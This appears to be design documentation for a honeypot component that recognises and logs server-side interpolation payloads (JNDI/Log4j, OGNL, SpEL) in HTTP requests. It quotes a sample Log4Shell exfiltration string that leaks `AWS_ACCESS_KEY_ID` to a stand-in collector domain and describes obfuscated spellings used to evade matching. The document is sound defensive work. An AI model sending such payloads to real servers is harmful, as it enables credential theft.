# Interpolation-payload observer

Some senders never ask for a path. They put an expression the *server*
is expected to evaluate into a header and wait to see whether anything
resolves it. The observer makes that countable. It serves no route of
its own — it annotates whatever line the request was already going to
produce.

## What it does

| Aspect | Behaviour |
| --- | --- |
| Trigger | An interpolation expression (`${jndi:…}`, `${env:…}`, OGNL `%{…}`, SpEL `${T(…)}`) anywhere in the request target, any header, or the head of the body |
| Response | **Unchanged.** No status, header or byte differs from the same request without a payload |
| Routes | None. Stamped before dispatch, so the fields ride on whichever trap answers |
| Upstream cost | None. Issues nothing |

Log fields added, when and only when a payload is present:

| Field | Meaning |
| --- | --- |
| `interpolationFamilies` | Which grammars were recognised: `jndi`, `credential-lookup`, `log4j-lookup`, `ognl`, `spel`, `bare-expression`, plus `obfuscated` when the payload was spelled character-by-character |
| `interpolationIn` | Where they were found: `target`, `body`, `header:<name>` |
| `interpolationCallbacks` | `scheme://host` the lookup points at — the sender's own infrastructure |
| `interpolationCallbackCount` | Distinct callbacks found, before the reporting cap |
| `interpolationLookupKeys` | The `env:` / `sys:` variable names asked for |
| `interpolationCount` | How many places on the request carried a payload |
| `interpolationSamples` | Short verbatim excerpts, capped, for reading the shape by eye |

## How recognition works

Three things have to happen for a match to be useful.

**De-obfuscation.** `${::-j}` and `${lower:j}` both resolve to `j`, so a
payload spelled entirely out of them is byte-different from every plain
one while behaving identically — that is the whole purpose of the
spelling. `_interp_deobfuscate()` collapses both forms repeatedly until
a pass changes nothing, which lets one pattern match every spelling
instead of needing a pattern per evasion. The pass count is bounded:
these rewrites are exactly what an adversary would use to make the
matcher loop.

**Separating the callback from the exfiltration.** In
`${jndi:ldap://${env:AWS_ACCESS_KEY_ID}.collect.example/x}` the nested
lookup is not part of the hostname — it is the channel. Log4j resolves
it before the lookup fires, so the variable's value leaves as a DNS
label and the sender reads it out of resolver logs without ever
needing a callback to connect. `_interp_callback_host()` strips the
nested part, leaving `collect.example`; the variable name is filed
separately under `interpolationLookupKeys`. The two answer different
questions — *whose infrastructure* and *what are they collecting* — and
merging them would put a variable name in the field used to attribute a
sender.

**Scanning every header.** The payload lands in `User-Agent` more often
than anywhere else, and `User-Agent` is not a header whose value is
worth writing to the log. `scan_headers()` is deliberately not
`header_subset()`: one decides what gets looked at, the other decides
what gets written down. Conflating them is what made a payload in
`User-Agent` read as an ordinary 404. Header *names* are reported, and
the extracted callbacks and variable names; raw header values are not.

Everything a sender controls is bounded — header count, header length,
body bytes scanned, de-obfuscation passes, and the length of every
reported list.

## Why

A request like this has nothing for a path-matched trap to match. The
path is usually `/`, the fingerprint is whatever HTTP library the sender
happened to use, and the volume is low because one probe per host is all
the technique needs. Everything distinguishing it is in a header, so
before this it was indistinguishable from any other 404 — and the
senders running it are asking, in the plainest possible terms, for
exactly the credentials the canary traps exist to hand out.

`interpolationLookupKeys` is the field that repays reading. A sender who
asks for `env:AWS_ACCESS_KEY_ID` has told you what they collect, before
they have collected anything. `interpolationCallbacks` is the other
half: it identifies the sender rather than the tool, because the
collector domain is theirs while the payload grammar is public.

Recognition is deliberately log-side only, for the same reason it is on
the [canary-echo observer](./canary-echo.md): a server that reacted to
an interpolation payload could be tested for honeypot-ness by sending it
one and diffing the reply, which would cost more than the measurement is
worth. The response is identical either way; only the line differs.

Matching on request *shape* rather than on a served path is what makes
this durable. A sender who improvises addresses defeats every
path-matched trap by construction, but cannot probe for expression
evaluation without sending an expression.

See also [canary-echo](./canary-echo.md), which watches the other end of
the same exchange — a credential this server handed out coming back.
